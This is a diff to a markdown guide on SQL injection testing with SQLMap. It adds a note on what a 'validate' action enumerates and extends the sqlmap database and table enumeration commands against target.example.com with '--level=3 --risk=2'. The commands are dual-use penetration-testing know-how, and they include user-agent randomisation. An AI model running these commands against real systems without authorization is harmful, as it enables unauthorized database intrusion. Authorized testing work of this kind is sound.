@@ -6,6 +6,13 @@
 
 ## Workflow
 
+### `sqli_map` validation behavior
+
+The `validate` action tests only the selected, observed parameter. When SQLMap
+confirms injection, it lists database and table names to provide schema context.
+It does not enumerate columns, check privileges, or retrieve table rows. The
+standalone `detect` action performs detection only.
+
 ### Step 1: Identify Potential Injection Points
 
 Manually browse the application and identify parameters that interact with the database. Use Burp Suite to capture requests.
@@ -48,14 +55,16 @@ sqlmap -u "https://target.example.com/dashboard" \
 ### Step 3: Enumerate Database Structure
 
 Once injection is confirmed, enumerate databases, tables, and columns.
+For captured requests, keep the same `--level=3 --risk=2` settings used during
+detection so SQLMap can rediscover the confirmed injection point while listing.
 
 ```bash
 # List all databases
-sqlmap -u "https://target.example.com/products?id=1" --dbs --batch --random-agent
+sqlmap -u "https://target.example.com/products?id=1" --dbs --batch --random-agent --level=3 --risk=2
 
 # List tables in a specific database
 sqlmap -u "https://target.example.com/products?id=1" \
-  -D target_db --tables --batch --random-agent
+  -D target_db --tables --batch --random-agent --level=3 --risk=2
 
 # List columns in a specific table
 sqlmap -u "https://target.example.com/products?id=1" \
